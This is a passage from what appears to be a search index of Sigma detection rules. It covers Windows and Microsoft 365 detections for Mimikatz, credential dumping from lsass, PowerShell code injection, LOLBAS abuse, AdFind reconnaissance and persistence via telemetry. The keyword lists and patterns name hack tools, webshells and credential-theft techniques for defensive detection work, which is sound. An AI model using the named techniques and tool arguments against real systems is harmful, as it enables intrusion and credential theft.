falsepositives: - Naughty administrators - Penetration test - AV Signature updates - Files with Mimikatz in their filename level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/win_alert_mimikatz_keywords.yml/","tags":["attack.s0002","attack.lateral_movement","attack.credential_access","car.2013-07-001","car.2019-04-004","attack.t1003.002","attack.t1003.004","attack.t1003.001","attack.t1003.006"],"title":"Mimikatz Use"},{"categories":null,"contents":"This detection method points out highly relevant Antivirus events\nKnown false-positives Some software piracy tools (key generators, cracks) are classified as hack tools References https://www.virustotal.com/gui/file/13828b390d5f58b002e808c2c4f02fdd920e236cc8015480fa33b6c1a9300e31 https://www.virustotal.com/gui/file/15b57c1b68cd6ce3c161042e0f3be9f32d78151fe95461eedc59a79fc222c7ed https://www.virustotal.com/gui/file/5092b2672b4cb87a8dd1c2e6047b487b95995ad8ed5e9fc217f46b8bfb1b8c01 Raw rule (edit) title: Relevant Anti-Virus Event id: 78bc5783-81d9-4d73-ac97-59f6db4f72a8 description: This detection method points out highly relevant Antivirus events status: experimental author: Florian Roth, Arnim Rupp date: 2017/02/19 modified: 2022/03/02 logsource: product: windows service: application references: - https://www.virustotal.com/gui/file/13828b390d5f58b002e808c2c4f02fdd920e236cc8015480fa33b6c1a9300e31 - https://www.virustotal.com/gui/file/15b57c1b68cd6ce3c161042e0f3be9f32d78151fe95461eedc59a79fc222c7ed - https://www.virustotal.com/gui/file/5092b2672b4cb87a8dd1c2e6047b487b95995ad8ed5e9fc217f46b8bfb1b8c01 detection: keywords: - \u0026#39;HTool-\u0026#39; - \u0026#39;Hacktool\u0026#39; - \u0026#39;ASP/Backdoor\u0026#39; - \u0026#39;JSP/Backdoor\u0026#39; - \u0026#39;PHP/Backdoor\u0026#39; - \u0026#39;Backdoor.ASP\u0026#39; - \u0026#39;Backdoor.JSP\u0026#39; - \u0026#39;Backdoor.PHP\u0026#39; - \u0026#39;Webshell\u0026#39; - \u0026#39;Portscan\u0026#39; - \u0026#39;Mimikatz\u0026#39; - \u0026#39;.WinCred.\u0026#39; # . are needed to avoid false positives with many other strings - \u0026#39;PlugX\u0026#39; - \u0026#39;Korplug\u0026#39; - \u0026#39;Pwdump\u0026#39; - \u0026#39;Chopper\u0026#39; - \u0026#39;WmiExec\u0026#39; - \u0026#39;Xscan\u0026#39; - \u0026#39;Clearlog\u0026#39; - \u0026#39;ASPXSpy\u0026#39; - \u0026#39;Ransom\u0026#39; - \u0026#39;Filecoder\u0026#39; - \u0026#39;CobaltStrike\u0026#39; filter: - \u0026#39;Keygen\u0026#39; - \u0026#39;Crack\u0026#39; condition: keywords and not 1 of filter* falsepositives: - Some software piracy tools (key generators, cracks) are classified as hack tools level: high tags: - attack.resource_development - attack.t1588 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_av_relevant_match.yml/","tags":["attack.resource_development","attack.t1588"],"title":"Relevant Anti-Virus Event"},{"categories":null,"contents":"This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted.\nKnown false-positives User using a disabled account References https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625 https://twitter.com/SBousseaden/status/1101431884540710913 Raw rule (edit) title: Account Tampering - Suspicious Failed Logon Reasons id: 9eb99343-d336-4020-a3cd-67f3819e68ee description: This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted. status: experimental author: Florian Roth date: 2017/02/19 modified: 2021/10/29 references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625 - https://twitter.com/SBousseaden/status/1101431884540710913 tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.initial_access - attack.t1078 logsource: product: windows service: security detection: selection: EventID: - 4625 - 4776 Status: - \u0026#39;0xC0000072\u0026#39; # User logon to account disabled by administrator - \u0026#39;0xC000006F\u0026#39; # User logon outside authorized hours - \u0026#39;0xC0000070\u0026#39; # User logon from unauthorized workstation - \u0026#39;0xC0000413\u0026#39; # Logon Failure: The machine you are logging onto is protected by an authentication firewall. The specified account is not allowed to authenticate to the machine - \u0026#39;0xC000018C\u0026#39; # The logon request failed because the trust relationship between the primary domain and the trusted domain failed - \u0026#39;0xC000015B\u0026#39; # The user has not been granted the requested logon type (aka logon right) at this machine filter: SubjectUserSid: \u0026#39;S-1-0-0\u0026#39; condition: selection and not filter falsepositives: - User using a disabled account level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logon_reasons.yml/","tags":["attack.persistence","attack.defense_evasion","attack.privilege_escalation","attack.initial_access","attack.t1078"],"title":"Account Tampering - Suspicious Failed Logon Reasons"},{"categories":null,"contents":"Detection of unusual child processes by different system processes\nKnown false-positives unknown References https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-74-638.jpg Raw rule (edit) title: Abused Debug Privilege by Arbitrary Parent Processes id: d522eca2-2973-4391-a3e0-ef0374321dae status: test description: Detection of unusual child processes by different system processes author: \u0026#39;Semanur Guneysu @semanurtg, oscd.community\u0026#39; references: - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-74-638.jpg date: 2020/10/28 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection1: ParentImage|endswith: - \u0026#39;\\winlogon.exe\u0026#39; - \u0026#39;\\services.exe\u0026#39; - \u0026#39;\\lsass.exe\u0026#39; - \u0026#39;\\csrss.exe\u0026#39; - \u0026#39;\\smss.exe\u0026#39; - \u0026#39;\\wininit.exe\u0026#39; - \u0026#39;\\spoolsv.exe\u0026#39; - \u0026#39;\\searchindexer.exe\u0026#39; selection2: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\cmd.exe\u0026#39; selection3: User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings filter: CommandLine|contains|all: - \u0026#39; route \u0026#39; - \u0026#39; ADD \u0026#39; condition: selection1 and selection2 and selection3 and not filter fields: - ParentImage - Image - User - CommandLine falsepositives: - unknown level: high tags: - attack.privilege_escalation - attack.t1548 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_abusing_debug_privilege.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"Abused Debug Privilege by Arbitrary Parent Processes"},{"categories":null,"contents":"Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism\nKnown false-positives Administrative findstr usage References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/ https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f Raw rule (edit) title: Abusing Findstr for Defense Evasion id: bf6c39fc-e203-45b9-9538-05397c1b4f3f status: test description: Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism author: \u0026#39;Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative\u0026#39; references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/ - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selectionFindstr: CommandLine|contains: - findstr selection_V_L: CommandLine|contains|all: - /V - /L selection_S_I: CommandLine|contains|all: - /S - /I condition: selectionFindstr and (selection_V_L or selection_S_I) falsepositives: - Administrative findstr usage level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_findstr.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Abusing Findstr for Defense Evasion"},{"categories":null,"contents":"Attackers can use print.exe for remote file copy\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml https://twitter.com/Oddvarmoe/status/985518877076541440 Raw rule (edit) title: Abusing Print Executable id: bafac3d6-7de9-4dd9-8874-4a1194b493ed status: test description: Attackers can use print.exe for remote file copy author: \u0026#39;Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative\u0026#39; references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml - https://twitter.com/Oddvarmoe/status/985518877076541440 date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \\print.exe CommandLine|startswith: - print selection2: CommandLine|contains: - /D exeCondition: CommandLine|contains: - .exe cmdExclude: CommandLine|contains: - print.exe condition: selection1 and selection2 and exeCondition and not cmdExclude falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_print.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Abusing Print Executable"},{"categories":null,"contents":"Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type.\nKnown false-positives none References https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/ Raw rule (edit) title: Abusing Windows Telemetry For Persistence id: f548a603-c9f2-4c89-b511-b089f7e94549 status: experimental description: Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type. references: - https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/ tags: - attack.defense_evasion - attack.persistence - attack.t1112 - attack.t1053 author: Sreeman date: 2020/09/29 modified: 2022/02/21 fields: - EventID - CommandLine - TargetObject - Details logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - \u0026#39;schtasks\u0026#39; - \u0026#39;\\Application Experience\\Microsoft Compatibility Appraiser\u0026#39; condition: selection falsepositives: - none level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_abusing_windows_telemetry_for_persistence.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1112","attack.t1053"],"title":"Abusing Windows Telemetry For Persistence"},{"categories":null,"contents":"Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type.\nKnown false-positives none References https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/ Raw rule (edit) title: Abusing Windows Telemetry For Persistence id: 4e8d5fd3-c959-441f-a941-f73d0cdcdca5 status: experimental description: Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type. references: - https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/ tags: - attack.defense_evasion - attack.persistence - attack.t1112 - attack.t1053 author: Sreeman date: 2020/09/29 modified: 2022/01/13 fields: - EventID - CommandLine - TargetObject - Details logsource: product: windows category: registry_event detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\\u0026#39; Details|endswith: - .sh - .exe - .dll - .bin - .bat - .cmd - .js - .ps - .vb - .jar - .hta - .msi - .vbs condition: selection falsepositives: - none level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_abusing_windows_telemetry_for_persistence.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1112","attack.t1053"],"title":"Abusing Windows Telemetry For Persistence"},{"categories":null,"contents":"Accesschk is an access and privilege audit tool developed by SysInternal and often being used by attacker to verify if a privilege escalation process successful or not\nKnown false-positives System administrator Usage Penetration test References https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-43-638.jpg Raw rule (edit) title: Accesschk Usage After Privilege Escalation id: c625d754-6a3d-4f65-9c9a-536aea960d37 status: test description: Accesschk is an access and privilege audit tool developed by SysInternal and often being used by attacker to verify if a privilege escalation process successful or not author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community references: - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-43-638.jpg date: 2020/10/13 modified: 2021/11/27 logsource: product: windows category: process_creation detection: integrity_level: IntegrityLevel: \u0026#39;Medium\u0026#39; product: Product|endswith: \u0026#39;AccessChk\u0026#39; description: Description|contains: \u0026#39;Reports effective permissions\u0026#39; condition: integrity_level and (product or description) fields: - IntegrityLevel - Product - Description falsepositives: - System administrator Usage - Penetration test level: high tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_accesschk_usage_after_priv_escalation.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Accesschk Usage After Privilege Escalation"},{"categories":null,"contents":"Detecting use WinAPI Functions in PowerShell\nKnown false-positives Carbon PowerShell Module (https://github.com/webmd-health-services/Carbon) References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse Raw rule (edit) title: Accessing WinAPI in PowerShell id: 03d83090-8cba-44a0-b02f-0b756a050306 status: experimental description: Detecting use WinAPI Functions in PowerShell author: Nikita Nazarov, oscd.community date: 2020/10/06 modified: 2022/02/23 references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse tags: - attack.execution - attack.t1059.001 - attack.t1106 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;WaitForSingleObject\u0026#39; - \u0026#39;QueueUserApc\u0026#39; - \u0026#39;RtlCreateUserThread\u0026#39; - \u0026#39;OpenProcess\u0026#39; - \u0026#39;VirtualAlloc\u0026#39; - \u0026#39;VirtualFree\u0026#39; - \u0026#39;WriteProcessMemory\u0026#39; - \u0026#39;CreateUserThread\u0026#39; - \u0026#39;CloseHandle\u0026#39; - \u0026#39;GetDelegateForFunctionPointer\u0026#39; - \u0026#39;CreateThread\u0026#39; - \u0026#39;memcpy\u0026#39; - \u0026#39;LoadLibrary\u0026#39; - \u0026#39;GetModuleHandle\u0026#39; - \u0026#39;GetProcAddress\u0026#39; - \u0026#39;VirtualProtect\u0026#39; - \u0026#39;FreeLibrary\u0026#39; - \u0026#39;ReadProcessMemory\u0026#39; - \u0026#39;CreateRemoteThread\u0026#39; - \u0026#39;AdjustTokenPrivileges\u0026#39; # - \u0026#39;WriteByte\u0026#39; # FP with .NET System.IO.FileStream - \u0026#39;WriteInt32\u0026#39; - \u0026#39;OpenThreadToken\u0026#39; - \u0026#39;PtrToString\u0026#39; - \u0026#39;FreeHGlobal\u0026#39; - \u0026#39;ZeroFreeGlobalAllocUnicode\u0026#39; - \u0026#39;OpenProcessToken\u0026#39; - \u0026#39;GetTokenInformation\u0026#39; - \u0026#39;SetThreadToken\u0026#39; - \u0026#39;ImpersonateLoggedOnUser\u0026#39; - \u0026#39;RevertToSelf\u0026#39; - \u0026#39;GetLogonSessionData\u0026#39; - \u0026#39;CreateProcessWithToken\u0026#39; - \u0026#39;DuplicateTokenEx\u0026#39; - \u0026#39;OpenWindowStation\u0026#39; - \u0026#39;OpenDesktop\u0026#39; - \u0026#39;MiniDumpWriteDump\u0026#39; - \u0026#39;AddSecurityPackage\u0026#39; - \u0026#39;EnumerateSecurityPackages\u0026#39; - \u0026#39;GetProcessHandle\u0026#39; - \u0026#39;DangerousGetHandle\u0026#39; - \u0026#39;kernel32\u0026#39; - \u0026#39;Advapi32\u0026#39; - \u0026#39;msvcrt\u0026#39; - \u0026#39;ntdll\u0026#39; # - \u0026#39;user32\u0026#39; # FP with chocolatey - \u0026#39;secur32\u0026#39; condition: selection falsepositives: - Carbon PowerShell Module (https://github.com/webmd-health-services/Carbon) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_accessing_win_api.yml/","tags":["attack.execution","attack.t1059.001","attack.t1106"],"title":"Accessing WinAPI in PowerShell"},{"categories":null,"contents":"Detects Accessing to lsass.exe by Powershell\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse Raw rule (edit) title: Accessing WinAPI in PowerShell for Credentials Dumping id: 3f07b9d1-2082-4c56-9277-613a621983cc description: Detects Accessing to lsass.exe by Powershell status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/05/24 references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse tags: - attack.credential_access - attack.t1003.001 logsource: product: windows service: sysmon detection: selection: EventID: - 8 - 10 SourceImage|endswith: \u0026#39;\\powershell.exe\u0026#39; TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/sysmon/sysmon_accessing_winapi_in_powershell_credentials_dumping.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Accessing WinAPI in PowerShell for Credentials Dumping"},{"categories":null,"contents":"Detecting Code injection with PowerShell in another process\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse Raw rule (edit) title: Accessing WinAPI in PowerShell. Code Injection. id: eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50 status: test description: Detecting Code injection with PowerShell in another process author: Nikita Nazarov, oscd.community references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse date: 2020/10/06 modified: 2021/11/27 logsource: product: windows category: create_remote_thread definition: \u0026#39;Note that you have to configure logging for CreateRemoteThread in Symson config\u0026#39; detection: selection: SourceImage|endswith: \u0026#39;\\powershell.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_powershell_code_injection.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Accessing WinAPI in PowerShell. Code Injection."},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported when users were active from an IP address that has been identified as an anonymous proxy IP address.\nKnown false-positives User using a VPN or Proxy References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Activity from Anonymous IP Addresses id: d8b0a4fe-07a8-41be-bd39-b14afa025d95 status: experimental description: Detects when a Microsoft Cloud App Security reported when users were active from an IP address that has been identified as an anonymous proxy IP address. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Activity from anonymous IP addresses\u0026#39; status: success condition: selection falsepositives: - User using a VPN or Proxy level: medium tags: - attack.command_and_control - attack.t1573 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_activity_from_anonymous_ip_addresses.yml/","tags":["attack.command_and_control","attack.t1573"],"title":"Activity from Anonymous IP Addresses"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported when an activity occurs from a location that wasn\u0026rsquo;t recently or never visited by any user in the organization.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Activity from Infrequent Country id: 0f2468a2-5055-4212-a368-7321198ee706 status: experimental description: Detects when a Microsoft Cloud App Security reported when an activity occurs from a location that wasn\u0026#39;t recently or never visited by any user in the organization. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Activity from infrequent country\u0026#39; status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1573 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_activity_from_infrequent_country.yml/","tags":["attack.command_and_control","attack.t1573"],"title":"Activity from Infrequent Country"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported users were active from an IP address identified as risky by Microsoft Threat Intelligence. These IP addresses are involved in malicious activities, such as Botnet C\u0026amp;C, and may indicate compromised account.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Activity from Suspicious IP Addresses id: a3501e8e-af9e-43c6-8cd6-9360bdaae498 status: experimental description: Detects when a Microsoft Cloud App Security reported users were active from an IP address identified as risky by Microsoft Threat Intelligence. These IP addresses are involved in malicious activities, such as Botnet C\u0026amp;C, and may indicate compromised account. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatDetection product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Activity from suspicious IP addresses\u0026#39; status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1573 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_from_suspicious_ip_addresses.yml/","tags":["attack.command_and_control","attack.t1573"],"title":"Activity from Suspicious IP Addresses"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported for users whose account were terminated in Azure AD, but still perform activities in other platforms such as AWS or Salesforce. This is especially relevant for users who use another account to manage resources, since these accounts are often not terminated when a user leaves the company.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Activity Performed by Terminated User id: 2e669ed8-742e-4fe5-b3c4-5a59b486c2ee status: experimental description: Detects when a Microsoft Cloud App Security reported for users whose account were terminated in Azure AD, but still perform activities in other platforms such as AWS or Salesforce. This is especially relevant for users who use another account to manage resources, since these accounts are often not terminated when a user leaves the company. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Activity performed by terminated user\u0026#39; status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.impact ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_activity_by_terminated_user.yml/","tags":["attack.impact"],"title":"Activity Performed by Terminated User"},{"categories":null,"contents":"Addition of domains is seldom and should be verified for legitimacy.\nKnown false-positives Legitimate extension of domain structure Raw rule (edit) title: Addition of Domain Trusts id: 0255a820-e564-4e40-af2b-6ac61160335c status: stable description: Addition of domains is seldom and should be verified for legitimacy. author: Thomas Patzke date: 2019/12/03 tags: - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 4706 condition: selection falsepositives: - Legitimate extension of domain structure level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_add_domain_trust.yml/","tags":["attack.persistence","attack.t1098"],"title":"Addition of Domain Trusts"},{"categories":null,"contents":"AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.\nKnown false-positives Admin activity References https://thedfirreport.com/2020/05/08/adfind-recon/ https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/ https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/ Raw rule (edit) title: AdFind Usage Detection id: 9a132afa-654e-11eb-ae93-0242ac130002 status: test description: AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain. author: Janantha Marasinghe (https://github.com/blueteam0ps) references: - https://thedfirreport.com/2020/05/08/adfind-recon/ - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/ - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/ date: 2021/02/02 modified: 2021/02/02 tags: - attack.discovery - attack.t1482 - attack.t1018 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;domainlist\u0026#39; - \u0026#39;trustdmp\u0026#39; - \u0026#39;dcmodes\u0026#39; - \u0026#39;adinfo\u0026#39; - \u0026#39; dclist \u0026#39; - \u0026#39;computer_pwdnotreqd\u0026#39; - \u0026#39;objectcategory=\u0026#39; - \u0026#39;-subnets -f\u0026#39; - \u0026#39;name=\u0026#34;Domain Admins\u0026#34;\u0026#39; - \u0026#39;-sc u:\u0026#39; - \u0026#39;domainncs\u0026#39; - \u0026#39;dompol\u0026#39; - \u0026#39; oudmp \u0026#39; - \u0026#39;subnetdmp\u0026#39; - \u0026#39;gpodmp\u0026#39; - \u0026#39;fspdmp\u0026#39; - \u0026#39;users_noexpire\u0026#39; - \u0026#39;computers_active\u0026#39; condition: selection falsepositives: - Admin activity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_ad_find_discovery.yml/","tags":["attack.discovery","attack.t1482","attack.t1018"],"title":"AdFind Usage Detection"},{"categories":null,"contents":"Detects suspicious local connections via a named pipe to the AD FS configuration database (Windows Internal Database). Used to access information such as the AD FS configuration settings which contains sensitive information used to sign SAML tokens.\nKnown false-positives Processes in the filter condition References https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSDBNamedPipeConnection.yaml https://o365blog.com/post/adfs/ https://github.com/Azure/SimuLand Raw rule (edit) title: ADFS Database Named Pipe Connection id: 1ea13e8c-03ea-409b-877d-ce5c3d2c1cb3 description: Detects suspicious local connections via a named pipe to the AD FS configuration database (Windows Internal Database). Used to access information such as the AD FS configuration settings which contains sensitive information used to sign SAML tokens. status: experimental date: 2021/10/08 modified: 2022/02/16 author: Roberto Rodriguez @Cyb3rWard0g references: - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSDBNamedPipeConnection.yaml - https://o365blog.com/post/adfs/ - https://github.com/Azure/SimuLand tags: - attack.collection - attack.t1005 logsource: product: windows category: pipe_created detection: selection: PipeName: \u0026#39;\\MICROSOFT##WID\\tsql\\query\u0026#39; filter: Image|endswith: - \u0026#39;\\Microsoft.IdentityServer.ServiceHost.exe\u0026#39; - \u0026#39;\\Microsoft.Identity.Health.Adfs.PshSurrogate.exe\u0026#39; - \u0026#39;\\AzureADConnect.exe\u0026#39; - \u0026#39;\\Microsoft.Tri.Sensor.exe\u0026#39; - \u0026#39;\\wsmprovhost.exe\u0026#39; - \u0026#39;\\mmc.exe\u0026#39; - \u0026#39;\\sqlservr.exe\u0026#39; - \u0026#39;\\tssdis.exe\u0026#39; condition: selection and not filter falsepositives: - Processes in the filter condition level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_susp_adfs_namedpipe_connection.yml/","tags":["attack.collection","attack.t1005"],"title":"ADFS Database Named Pipe Connection"},{"categories":null,"contents":"This rule looks for Windows Installer service (msiexec.exe) spawned command line and/or powershell\nKnown false-positives Penetration test References https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-50-638.jpg Raw rule (edit) title: Always Install Elevated MSI Spawned Cmd And Powershell id: 1e53dd56-8d83-4eb4-a43e-b790a05510aa status: test description: This rule looks for Windows Installer service (msiexec.exe) spawned command line and/or powershell author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community references: - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-50-638.jpg date: 2020/10/13 modified: 2021/11/27 logsource: product: windows category: process_creation detection: image: Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; parent_image: ParentImage|contains|all: - \u0026#39;\\Windows\\Installer\\\u0026#39; - \u0026#39;msi\u0026#39; ParentImage|endswith: - \u0026#39;tmp\u0026#39; condition: image and parent_image fields: - Image - ParentImage falsepositives: - Penetration test level: medium tags: - attack.privilege_escalation - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_always_install_elevated_msi_spawned_cmd_powershell.yml/","tags":["attack.privilege_escalation","attack.t1548.002"],"title":"Always Install Elevated MSI Spawned Cmd And Powershell"},{"categories":null,"contents":"Detects a highly relevant Antivirus alert that reports an exploitation framework\nKnown false-positives Unlikely References https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Raw rule (edit) title: Antivirus Exploitation Framework Detection id: 238527ad-3c2c-4e4f-a1f6-92fd63adb864 status: test description: Detects a highly relevant Antivirus alert that reports an exploitation framework author: Florian Roth references: - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ date: 2018/09/09 modified: 2021/11/27 logsource: product: antivirus detection: selection: Signature|contains: - \u0026#39;MeteTool\u0026#39; - \u0026#39;MPreter\u0026#39; - 